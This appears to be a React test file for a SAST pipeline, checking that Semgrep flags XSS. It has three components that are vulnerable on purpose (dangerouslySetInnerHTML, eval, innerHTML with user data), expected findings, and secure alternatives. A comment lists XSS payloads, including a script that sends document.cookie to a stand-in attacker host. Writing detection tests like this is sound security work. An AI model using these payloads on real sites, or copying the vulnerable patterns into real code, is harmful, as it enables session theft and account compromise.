// Test file for SAST: Cross-Site Scripting (XSS) Vulnerability
// Feature: 002-gitlab-security-pipeline
// Purpose: Test Semgrep detection of XSS via dangerouslySetInnerHTML
// Expected: HIGH severity finding - XSS via unsafe HTML rendering

import React, { useState, useEffect } from 'react';

// VULNERABLE: XSS via dangerouslySetInnerHTML with user input
// Semgrep Rule: javascript.react.security.audit.react-dangerouslysetinnerhtml
function UserProfile({ userId }) {
  const [userBio, setUserBio] = useState('');

  useEffect(() => {
    // Simulating fetch from API
    fetch(`/api/users/${userId}/bio`)
      .then(res => res.json())
      .then(data => setUserBio(data.bio));
  }, [userId]);

  // ❌ UNSAFE: User-controlled HTML rendered without sanitization
  return (
    <div className="user-profile">
      <h2>User Biography</h2>
      <div dangerouslySetInnerHTML={{ __html: userBio }} />
    </div>
  );
}

// VULNERABLE: XSS via eval() with user input
// Semgrep Rule: javascript.lang.security.audit.eval-detected
function DynamicCalculator({ expression }) {
  const [result, setResult] = useState(null);

  const calculate = () => {
    // ❌ UNSAFE: eval() with user input can execute arbitrary code
    const computedResult = eval(expression);
    setResult(computedResult);
  };

  return (
    <div>
      <button onClick={calculate}>Calculate: {expression}</button>
      <p>Result: {result}</p>
    </div>
  );
}

// VULNERABLE: DOM-based XSS via innerHTML
function CommentDisplay({ commentId }) {
  useEffect(() => {
    fetch(`/api/comments/${commentId}`)
      .then(res => res.json())
      .then(data => {
        // ❌ UNSAFE: Setting innerHTML with unsanitized user content
        document.getElementById('comment-content').innerHTML = data.text;
      });
  }, [commentId]);

  return <div id="comment-content" />;
}

// Example Attack Vectors:
// userBio: "<img src=x onerror='alert(document.cookie)'>"
// userBio: "<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>"
// expression: "console.log(document.cookie)"
// comment: "<iframe src='javascript:alert(1)'></iframe>"

// Expected SAST Findings:
// - CWE-79: Cross-Site Scripting (XSS)
// - CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (eval)
// - Severity: HIGH
// - Locations: Line 23, Line 37, Line 53
// - Solution: Use DOMPurify or avoid dangerouslySetInnerHTML, never use eval()

// SECURE Alternatives (for reference):
// 1. Use textContent instead of innerHTML:
//    document.getElementById('comment-content').textContent = data.text;
//
// 2. Use DOMPurify library:
//    import DOMPurify from 'dompurify';
//    <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userBio) }} />
//
// 3. Avoid eval(), use Function constructor with validation or math parser libraries

export { UserProfile, DynamicCalculator, CommentDisplay };
